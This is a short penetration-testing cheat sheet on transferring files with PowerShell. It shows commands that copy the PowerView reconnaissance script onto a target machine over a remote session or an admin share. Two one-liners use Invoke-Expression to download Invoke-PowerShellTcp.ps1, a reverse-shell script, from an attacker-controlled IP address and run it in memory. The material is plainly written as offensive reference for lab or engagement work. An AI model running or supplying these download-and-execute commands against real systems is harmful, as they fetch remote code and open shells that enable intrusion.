---
description: Downloading and transferring files with PowerShell
---

# Download / Transfer files

## Session Transfer

Creating session

```text
$cs = New-PSSession machine1.pentest.local
```

Transfering files

```text
Copy-Item C:\AD\Tools\PowerView.ps1 -Destination "C:\Windows\Temp\PowerView.ps1" -ToSession $cs
```

## Copy-Item

```text
Copy-Item .\PowerView.ps1 \\machine1.pentest.local\c$\Windows\Temp\
```

## Using iex - Invoke-Expression

```text
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.78/Invoke-PowerShellTcp.ps1'));
```

OR

```text
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);
```

